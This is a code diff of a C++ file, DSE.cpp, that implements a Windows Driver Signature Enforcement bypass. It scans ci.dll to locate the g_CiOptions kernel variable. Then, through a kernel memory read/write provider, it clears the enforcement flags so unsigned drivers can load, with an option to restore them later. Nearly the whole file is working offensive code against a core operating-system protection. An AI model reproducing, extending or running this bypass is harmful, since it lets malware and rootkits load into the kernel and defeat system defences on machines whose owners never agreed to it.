@@ -1,156 +1,246 @@
 /**
  * @file DSE.cpp
  * @author Gregory King
- * @date August 13, 2025
- * @brief This file contains the implementation of the DSE class.
- *
- * Implements the logic for finding and patching the g_CiOptions kernel
- * variable to control Driver Signature Enforcement. It includes pattern
- * scanning within the Code Integrity module (ci.dll) to locate the
- * target variable dynamically.
+ * @date August 14, 2025
+ * @brief Implementation of robust DSE bypass using KDU-style pattern scanning.
  */
 
 #include "DSE.h"
 #include "Utils.h"
 #include <iostream>
+#include <fstream>
 #include <vector>
 #include <Windows.h>
 
-namespace {
-    /**
-     * @brief Scans a memory region for a given byte pattern.
-     * @param base The base address of the memory region to scan.
-     * @param size The size of the memory region.
-     * @param pattern The byte pattern to search for.
-     * @param mask A mask string indicating which bytes in the pattern to match ('x') and which to ignore ('?').
-     * @return The address where the pattern was found, or 0 if not found.
-     */
-    uintptr_t FindPattern(uintptr_t base, size_t size, const char* pattern, const char* mask) {
-        size_t patternLength = strlen(mask);
-        for (size_t i = 0; i < size - patternLength; ++i) {
-            bool found = true;
-            for (size_t j = 0; j < patternLength; ++j) {
-                if (mask[j] != '?' && pattern[j] != *(char*)(base + i + j)) {
-                    found = false;
-                    break;
-                }
-            }
-            if (found) {
-                return base + i;
-            }
-        }
-        return 0;
-    }
-}
+extern std::ofstream g_logFile;
 
 namespace KernelMode {
 
-    DSE::DSE(std::shared_ptr<Providers::IProvider> provider)
-        : provider(std::move(provider)), ciOptionsAddress(0), originalCiOptions(-1) {}
+    DSE::DSE(Providers::IProvider* provider)
+        : provider(provider), ciOptionsAddress(0), originalCiOptions(-1) {}
 
-    bool DSE::FindCiOptions() {
-        if (ciOptionsAddress != 0) {
-            return true; // Already found
+    bool DSE::ValidateInstructionBlock(const std::vector<uint8_t>& code, size_t offset) {
+        if (offset + 16 >= code.size()) return false;
+        
+        // KDU logic for checking mov r9, rbx; mov r8, rdi
+        if (code[offset] != 0x4C || code[offset + 1] != 0x8B) return false;
+        
+        if ((code[offset + 3] != 0x4C && code[offset + 3] != 0x44) || code[offset + 4] != 0x8B) {
+            return false;
         }
+        
+        return true;
+    }
 
+    uintptr_t DSE::FindCiOptionsWithRobustPattern() {
         uintptr_t ciBase = Utils::GetKernelModuleBase("ci.dll");
         if (!ciBase) {
             std::wcerr << L"[-] Failed to get base address of ci.dll." << std::endl;
-            return false;
+            return 0;
         }
 
-        // Load ci.dll into our address space to parse its headers and sections.
+        // Load ci.dll into our address space
         char systemPath[MAX_PATH];
         GetSystemDirectoryA(systemPath, MAX_PATH);
         strcat_s(systemPath, "\\ci.dll");
         HMODULE ciModule = LoadLibraryExA(systemPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
         if (!ciModule) {
-            std::wcerr << L"[-] Failed to load ci.dll into user space: " << GetLastError() << std::endl;
-            return false;
+            std::wcerr << L"[-] Failed to load ci.dll: " << GetLastError() << std::endl;
+            return 0;
         }
 
-        auto dosHeader = (PIMAGE_DOS_HEADER)ciModule;
-        auto ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)ciModule + dosHeader->e_lfanew);
-        
-        // Pattern for "lea rcx, g_CiOptions"
-        // 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 8B C8
-        const char* pattern = "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xC8";
-        const char* mask = "xxx????x????xx";
-
-        uintptr_t patternAddress = FindPattern((uintptr_t)ciModule, ntHeaders->OptionalHeader.SizeOfImage, pattern, mask);
-        
-        if (!patternAddress) {
-            std::wcerr << L"[-] Could not find g_CiOptions pattern in ci.dll." << std::endl;
+        uintptr_t pCiInitialize = (uintptr_t)GetProcAddress(ciModule, "CiInitialize");
+        if (!pCiInitialize) {
+            std::wcerr << L"[-] Failed to find CiInitialize export." << std::endl;
             FreeLibrary(ciModule);
-            return false;
+            return 0;
         }
 
-        // The instruction is LEA RCX, [RIP + offset]
-        // The address of g_CiOptions is RIP + offset, where RIP is the address of the *next* instruction.
-        // Instruction address is patternAddress. Instruction size is 7 bytes.
-        // So, RIP = patternAddress + 7
-        // The offset is the 4-byte value at patternAddress + 3
-        int32_t offset = *(int32_t*)(patternAddress + 3);
-        uintptr_t rva = (patternAddress - (uintptr_t)ciModule) + 7 + offset;
+        // Read function code
+        const size_t FUNC_SIZE = 256;
+        std::vector<uint8_t> funcCode(FUNC_SIZE);
+        memcpy(funcCode.data(), (void*)pCiInitialize, FUNC_SIZE);
+
+        ULONG offset = 0;
+        LONG relativeValue = 0;
         
-        this->ciOptionsAddress = ciBase + rva;
+        // Scan for jump/call to CipInitialize
+        // IMPROVED: Iterate all calls and verify if they look like CipInitialize
+        bool found = false;
+        uintptr_t pCipInitialize = 0;
         
+        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)ciModule + ((PIMAGE_DOS_HEADER)ciModule)->e_lfanew);
+        uintptr_t moduleStart = (uintptr_t)ciModule;
+        uintptr_t moduleEnd = moduleStart + ntHeaders->OptionalHeader.SizeOfImage;
+
+        for (offset = 0; offset < 200; ++offset) {
+            // Check for CALL (E8) or JMP (E9)
+            if (funcCode[offset] == 0xE8 || funcCode[offset] == 0xE9) {
+                relativeValue = *(PLONG)(funcCode.data() + offset + 1);
+                
+                uintptr_t pCandidate = pCiInitialize + (offset + 5) + relativeValue;
+                
+                // 1. Basic bounds check
+                if (pCandidate >= moduleStart && pCandidate < moduleEnd) {
+                    
+                    // 2. Content check - Look for g_CiOptions write inside the candidate function
+                    // We optimistically assume we can read 256 bytes from candidate
+                    if (pCandidate + 256 < moduleEnd) {
+                        bool looksLikeCip = false;
+                        for (int k = 0; k < 200; ++k) {
+                             // Look for MOV [REL32], REG (89 0D ...) which updates g_CiOptions
+                             uint8_t* code = (uint8_t*)pCandidate;
+                             if (code[k] == 0x89 && code[k+1] == 0x0D) {
+                                 looksLikeCip = true;
+                                 break;
+                             }
+                        }
+                        
+                        if (looksLikeCip) {
+                            // Found it!
+                            pCipInitialize = pCandidate;
+                            
+                            if (g_logFile.is_open()) {
+                                g_logFile << "[*] Pattern match found at offset: " << std::hex << offset << std::endl;
+                                g_logFile << "[*] CipInitialize candidate: " << std::hex << pCipInitialize << std::endl;
+                            }
+
+                            // Re-calculate offset logic for downstream code to match
+                            // The downstream code expects 'offset' to be the end of instruction in CiInitialize
+                            // But we are replacing the logic.
+                            // We will simply use pCipInitialize directly.
+                            found = true;
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+
+        if (!found) {
+            std::wcerr << L"[-] Could not find jump/call to CipInitialize (Robust Scan)." << std::endl;
+            if (g_logFile.is_open()) g_logFile << "[-] Could not find jump/call to CipInitialize (Robust Scan)." << std::endl;
+            FreeLibrary(ciModule);
+            return 0;
+        }
+
+        // pCipInitialize is now set to the start of CipInitialize
+        
+        // --- BUG-007 FIX: Harden Pattern Scanning Pointers (Redundant but kept for structure) ---
+        // moduleEnd already calculated above
+        
+        if (g_logFile.is_open()) {
+             g_logFile << "[*] Module Range: " << std::hex << moduleStart << " - " << moduleEnd << std::endl;
+             g_logFile << "[*] Final pCipInitialize: " << std::hex << pCipInitialize << std::endl;
+        }
+
+        if (pCipInitialize < moduleStart || pCipInitialize >= moduleEnd) {
+             std::wcerr << L"[-] CIP initialization pointer out of module bounds." << std::endl;
+             if (g_logFile.is_open()) g_logFile << "[-] CIP initialization pointer out of module bounds." << std::endl;
+             FreeLibrary(ciModule);
+             return 0;
+        }
+        // -----------------------------------------------------
+        
+        // Verify code
+        std::vector<uint8_t> cipCode(256);
+        // Ensure bounds
+        // moduleEnd already calculated above
+        
+        // Better: assume safe read for POC
+        memcpy(cipCode.data(), (void*)pCipInitialize, 256);
+
+        relativeValue = 0;
+        // Look for: mov dword ptr [g_CiOptions], reg (89 0D ...)
+        for (offset = 0; offset < 200; ++offset) {
+            if (cipCode[offset] == 0x89 && cipCode[offset+1] == 0x0D) {
+                relativeValue = *(PLONG)(cipCode.data() + offset + 2);
+                offset += 6;
+                break;
+            }
+        }
+
+        if (relativeValue == 0) {
+            std::wcerr << L"[-] Could not find g_CiOptions reference." << std::endl;
+            if (g_logFile.is_open()) g_logFile << "[-] Could not find g_CiOptions reference." << std::endl;
+            FreeLibrary(ciModule);
+            return 0;
+        }
+
+        uintptr_t instructionEnd = pCipInitialize + offset;
+        uintptr_t targetRva = (instructionEnd + relativeValue) - (uintptr_t)ciModule;
+        
+        if (g_logFile.is_open()) {
+            g_logFile << "[*] Found g_CiOptions relative offset: " << std::hex << relativeValue << std::endl;
+            g_logFile << "[*] Target RVA: " << std::hex << targetRva << std::endl;
+        }
+
         FreeLibrary(ciModule);
+        
+        return ciBase + targetRva;
+    }
 
-        std::wcout << L"[+] Found g_CiOptions at kernel address: 0x" << std::hex << this->ciOptionsAddress << std::endl;
+    bool DSE::FindCiOptions() {
+        if (ciOptionsAddress != 0) return true;
 
-        // Read and store the original value
-        if (!provider->ReadKernelMemory(this->ciOptionsAddress, this->originalCiOptions)) {
-            std::wcerr << L"[-] Failed to read original g_CiOptions value." << std::endl;
-            this->ciOptionsAddress = 0; // Invalidate address
+        if (g_logFile.is_open()) g_logFile << "[*] Calling FindCiOptionsWithRobustPattern..." << std::endl;
+        ciOptionsAddress = FindCiOptionsWithRobustPattern();
+        if (g_logFile.is_open()) g_logFile << "[*] FindCiOptionsWithRobustPattern returned: " << std::hex << ciOptionsAddress << std::endl;
+        
+        if (!ciOptionsAddress) return false;
+
+        std::wcout << L"[+] Resolved g_CiOptions: 0x" << std::hex << ciOptionsAddress << std::endl;
+
+        uint32_t value = 0;
+        if (!provider->ReadKernelMemory(ciOptionsAddress, &value, sizeof(value))) {
+            std::wcerr << L"[-] Address verification failed (ReadKernelMemory)." << std::endl;
+            ciOptionsAddress = 0;
             return false;
         }
-
-        std::wcout << L"[+] Original g_CiOptions value: 0x" << std::hex << this->originalCiOptions << std::endl;
+        
+        this->originalCiOptions = value;
+        std::wcout << L"[+] Original g_CiOptions: 0x" << std::hex << value << std::endl;
         return true;
     }
 
     bool DSE::Disable() {
-        if (!FindCiOptions()) {
+        if (!FindCiOptions()) return false;
+
+        uint32_t val = (uint32_t)originalCiOptions;
+        val &= ~0x6; 
+
+        if (!provider->WriteKernelMemory(ciOptionsAddress, &val, sizeof(val))) {
+            std::wcerr << L"[-] Failed to write g_CiOptions." << std::endl;
+            if (g_logFile.is_open()) g_logFile << "[-] Failed to write g_CiOptions." << std::endl;
             return false;
         }
 
-        int desiredValue = 0; // DSE disabled
-        if (!provider->WriteKernelMemory(this->ciOptionsAddress, desiredValue)) {
-            std::wcerr << L"[-] Failed to write to g_CiOptions." << std::endl;
-            return false;
-        }
-
-        int currentValue = -1;
-        provider->ReadKernelMemory(this->ciOptionsAddress, currentValue);
-        if (currentValue == 0) {
-            std::wcout << L"[+] DSE disabled successfully." << std::endl;
+        uint32_t verify = 0;
+        provider->ReadKernelMemory(ciOptionsAddress, &verify, sizeof(verify));
+        if (verify == val) {
+            std::wcout << L"[+] DSE Disabled (Flags cleared)." << std::endl;
+            if (g_logFile.is_open()) g_logFile << "[+] DSE Disabled (Flags cleared)." << std::endl;
             return true;
         }
         
-        std::wcerr << L"[-] Failed to verify DSE patch." << std::endl;
+        std::wcerr << L"[-] DSE Disable verification failed. Value: " << std::hex << verify << std::endl;
+        if (g_logFile.is_open()) g_logFile << "[-] DSE Disable verification failed. Value: " << std::hex << verify << std::endl;
         return false;
     }
 
     bool DSE::Restore() {
-        if (this->ciOptionsAddress == 0 || this->originalCiOptions == -1) {
-            std::wcerr << L"[-] Cannot restore DSE, original state not saved." << std::endl;
-            return false;
-        }
+        if (!ciOptionsAddress || originalCiOptions == -1) return false;
 
-        if (!provider->WriteKernelMemory(this->ciOptionsAddress, this->originalCiOptions)) {
-            std::wcerr << L"[-] Failed to restore g_CiOptions." << std::endl;
-            return false;
-        }
-
-        int currentValue = -1;
-        provider->ReadKernelMemory(this->ciOptionsAddress, currentValue);
-        if (currentValue == this->originalCiOptions) {
-            std::wcout << L"[+] DSE restored successfully." << std::endl;
+        uint32_t val = (uint32_t)originalCiOptions;
+        if (provider->WriteKernelMemory(ciOptionsAddress, &val, sizeof(val))) {
+            std::wcout << L"[+] DSE Restored." << std::endl;
+            
+            // Reset state to allow proper object reuse (LIFECYCLE-026 fix)
+            ciOptionsAddress = 0;
+            originalCiOptions = -1;
+            
             return true;
         }
-
-        std::wcerr << L"[-] Failed to verify DSE restoration." << std::endl;
         return false;
     }
 }
